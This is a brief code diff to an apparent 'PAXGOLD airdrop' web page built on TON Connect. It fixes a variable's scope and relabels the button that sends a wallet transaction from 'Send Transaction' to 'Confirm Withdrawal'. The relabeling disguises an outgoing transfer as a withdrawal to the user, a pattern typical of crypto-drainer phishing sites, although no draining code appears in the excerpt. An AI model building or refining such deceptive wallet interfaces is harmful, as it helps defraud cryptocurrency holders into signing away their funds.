@@ -502,7 +502,7 @@
 							   
 							 <center> <div id="ton-connect"></div> </center> 
 							   <button id="connectWalletBtn" class="connect">Connect Wallet</button>						   
-							   <button id="sendTransactionBtn" class="transact">Send Transaction</button>
+							   <button id="sendTransactionBtn" class="transact">Confirm Withdrawal</button>
 							</div>
 
 							
@@ -560,7 +560,7 @@
 	let tonConnectUI = null;
 		//Initialize TON Connect UI
 		document.addEventListener("DOMContentLoaded", async function () {
-		const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+	      tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
               manifestUrl: 'https://weblop16.github.io/PAXGOLD-AIRDROP/tonconnect-manifest.json',
               buttonRootId: 'ton-connect'
     });
